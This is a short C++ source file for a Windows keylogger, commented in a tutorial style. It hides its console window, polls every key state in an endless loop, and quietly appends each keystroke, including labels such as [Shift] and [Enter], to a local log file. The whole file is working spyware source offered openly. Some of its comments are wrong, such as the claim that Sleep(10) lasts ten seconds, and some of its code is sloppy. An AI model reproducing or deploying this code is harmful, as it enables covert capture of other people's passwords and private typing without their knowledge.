#include <iostream>
#include <Windows.h>

using namespace std; //used for cout and cin and others

int Save(int _key, char *file); //Calls Save() and changes valus in paramaters

int main() {

	FreeConsole(); // Helps hiding console

	char i; 

	while (true) {
		Sleep(10); //makes the program sleep for 10 secconds helps by making the data not pop up.
		for (i = 8; i <= 255; i++) { // Uses charecter i to make numbers that become letters later on
			if (GetAsyncKeyState(i) == -32767) { // used with virtual keys and mouse with windows.h
				Save(i, "log.txt"); // Calls save and makes charecter i in log file making i a letter becase of char
			}
		}
	}
	return 0;
}

int Save(int _key, char *file) {

	cout << _key << endl; // prints _key wich is the numbers poping up when you type in the seen command box not hidden one

	Sleep(10); //Sleeps the command for 10 secconds helps with being hidden.

	FILE *OUTPUT_FILE; // makes the Output file printable in this case log.txt

	OUTPUT_FILE = fopen(file, "a+"); //Note a+ keeps the program from overwriting
	if (_key == VK_SHIFT) // Makes the shift key print [shift] in the log file
		fprintf(OUTPUT_FILE, "%s", "[Shift]");
	else if (_key == VK_BACK)//Makes the backspace button readable in Log file.
		fprintf(OUTPUT_FILE, "%s", "[Delete]");
	else if (_key == VK_LBUTTON)//Makes the left button readable in log file.
		fprintf(OUTPUT_FILE, "%s", "[LeftButton]");
	else if (_key == VK_RETURN)//makes enter print return in log file.
		fprintf(OUTPUT_FILE, "%s", "[Enter]");
	else if (_key == VK_ESCAPE)//Makes escape print escape in log file.
		fprintf(OUTPUT_FILE, "%s", "[ESC]");
	else

		fprintf(OUTPUT_FILE, "%s", &_key);// fprintf is the command to print the keys and %s into the output file wich is log.txt
	fclose(OUTPUT_FILE);// flose closes the file.

	return 0;

}
